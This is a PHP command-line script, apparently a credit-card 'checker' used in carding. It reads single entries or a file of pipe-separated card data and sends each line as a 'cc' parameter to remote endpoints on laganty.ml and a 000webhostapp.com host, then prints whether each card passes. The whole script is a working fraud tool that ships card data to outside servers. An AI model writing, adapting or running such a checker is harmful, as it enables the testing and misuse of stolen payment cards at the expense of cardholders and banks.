<?php
$green = "\033[92m";
$red = "\033[91m";
$cyan = "\033[36m";
$yellow = "\033[93m";
$bold = "\033[5m";
$white = "\033[0m";
$r=$red;
$y=$yellow;
$g=$green;
$logo=$r."
$$$$$$$$$$|  $$|        $$|  $$|                $$$$|       $$|    $$$$$$$$$$$|  $$$$$$$$$$$$$|
 $$$$|        $$|        $$| $$|                 $$|  $$|    $$|    $$$|               $$$|
  $|           $$$$$$$|   $$$$|    $green   $$$$$$$| $yellow   $$|   $$|   $$|    $$$$$$$$$$$|       $$$|
   $$$$|        $$|  $$|   $$| $$|                 $$|    $$|  $$|    $$$|               $$$|
    $$$$$$$$$$|  $$|  $$|   $$|  $$|                $$|      $$$$$|    $$$$$$$$$$$|       $$$|                                                 
";
print $logo;
print "\n";
print $bold . $g . "[ + ] ".$red."option : ".$cyan;
$chk=trim(fgets(STDIN,1024));
print "\n";


if(preg_match('/^(!chklist) (.*)/is',$chk)){
    $ex=explode(' ',$chk);
    if(!$ex[1] | $ex[1]==null){
        print "error\n";
    }else{
        $ger=file_get_contents($ex[1]);
        if(!$ger | $ger==null){
            print "invaild $ex[1]\n";
        }else{
            $exr=explode("\n",$ger);
            $cu=count($exr);
            for($i=0;$i < $cu;$i++){
                $ggg=str_replace(" ","",$exr[$i]);
                $get=file_get_contents('https://laganty.ml/.rest/chknet.php?cc='.$ggg);
                $js=json_decode($get, true);
                if($js['error']==0){
                    print $g.$js['msg']."\n";
                }else{
                    print $r.$js['msg']."\n";
                }
            }
            print "\n\n";
            print $bold . $g . "[ + ] ".$red."return? [y/n] : ".$cyan;
            $ce=trim(fgets(STDIN,1024));
            print "\n";
        }
    }
}

if(preg_match('/^(!chk) (.*)/is',$chk)){
    $ex=explode(' ',$chk);
    $mystring = $ex[1];
    $findme   = '|';
    $pos = strpos($mystring, $findme);
    if ($pos === false) {
      print "bitch wheres the | ?\n";
    }else{
        $get=file_get_contents('https://protonapi.000webhostapp.com/chknet.php?cc='.$ex[1]);
        $js=json_decode($get, true);
        if($js['error']==0){
            print $g.$js['msg']."\n";
        }else{
            print $r.$js['msg']."\n";
        }
        print "\n\n";
        print $bold . $g . "[ + ] ".$red."return? [y/n] : ".$cyan;
        $ce=trim(fgets(STDIN,1024));
        print "\n";
    }
}

if($ce=="y" | $ce=="Y" | $ce=="yes" | $ce=="YES"){
    @system('php run.php');
}else{
    print "bye bye...\n";
}
